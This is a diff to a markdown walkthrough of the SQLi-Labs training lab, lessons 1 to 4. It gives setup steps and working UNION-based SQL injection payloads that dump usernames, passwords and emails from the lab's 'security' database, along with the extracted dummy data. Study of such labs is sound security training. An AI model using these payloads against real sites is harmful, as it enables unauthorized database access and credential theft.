@@ -2,8 +2,8 @@ __SQLI LABS__
 ==========
 First we have to setup the lab:
 
-* install apache2 webserver by ">sudo apt install apache2"
-* install mysql by ">sudo apt-get install mysql-srver"
+* install apache2 webserver by ```>sudo apt install apache2```
+* install mysql by ```>sudo apt-get install mysql-srver```
 * install php7
 * git clone the repository of the lab and start all the service required
 
@@ -13,9 +13,9 @@ _dump the contents of the databse using sqli_
  
 ##LESS-1
 ========
-* first we have to pass the "?id=" parameter and pass a numeric value
+* first we have to pass the ```?id=``` parameter and pass a numeric value
 * fuzz the parameter to get sqli
-* when we put "'" we get sql error thus we have a sql injection we can comment ou the rest of the query by "-- -"or "--+" or any comments in sql
+* when we put ```'``` we get sql error thus we have a sql injection we can comment ou the rest of the query by ```-- -```or ```--+``` or any comments in sql
 * then we can dump the contents
 
  ##payloads to dump
@@ -27,7 +27,7 @@ to find table name 	    	= ```/?id=-1' union select 1,group_concat(table_name),3
 
 to find the column name	    	=```/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+```
 
-to find the data 	    	=``` /?id=-1' union select 1,group_concat(username),concat(password) from users```
+to find the data 	    	=``` /?id=-1' union select 1,group_concat(username),group_concat(password) from users```
 
 contents of database
 --------------------
@@ -39,24 +39,30 @@ contents of database
 
 ##LESS-2
 ========
-* when we fuzz the id parameter this time single qot(') i.e " ?id=1' "does not work
-* when we put a "'" before and after the 1 it worked i.e "?id='1'"
-* we can now comment (--+) rest and dump teh database using the same payloads (change 1' => '1') from lesson 1
+* when we fuzz the id parameter this time single qot(') i.e ``` ?id=1' ```does not work
+* when we put a ```'``` before and after the 1 it worked i.e ```?id='1'```
+* we can now comment ```--+``` rest and dump teh database using the same payloads (change 1' => '1') from lesson 1
 
+##PAYLOAD EXAMPLE
+=================
+to find the data 	    	=``` /?id='-1' union select 1,group_concat(id),group_concat(email) from emails```
 contents of database
 --------------------
 * name of database=security
 * tables          =emails,referers,uagents,users
 * columns in email=email_id,id
-* id		=1,2,3,4,5,6,7,8
+* id	            	=1,2,3,4,5,6,7,8
 * email=Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com 
 
 
 ##LESS-3
 ========
-* in this lesson when we fuzz the id parameter we can find " ') "  is used to take our input so we can use " ') "  as payload
-* the comment it and do the same payload form less-1
+* in this lesson when we fuzz the id parameter we can find ``` ') ```  is used to take our input so we can use ``` ') ```  as payload
+* then comment it and do the same payload form less-1
 
+##PAYLOAD EXAMPLE
+=================
+to find the data 	    	=``` /?id=-1') union select 1,group_concat(username),3 from users```
 contents of database
 --------------------
 name of database=security
@@ -67,6 +73,11 @@ LESS-4
 ======
 * in this challenge we have to use ' ") ' as payload
 * we can use 'and' or 'or' to complete the query insted of commenting
+
+##PAYLOAD EXAMPLE
+=================
+to find the data 	    	=``` /?id=-1") union select 1,group_concat(username),group_concat(password) from users```
+
 contents of database
 --------------------
 * name of database=security
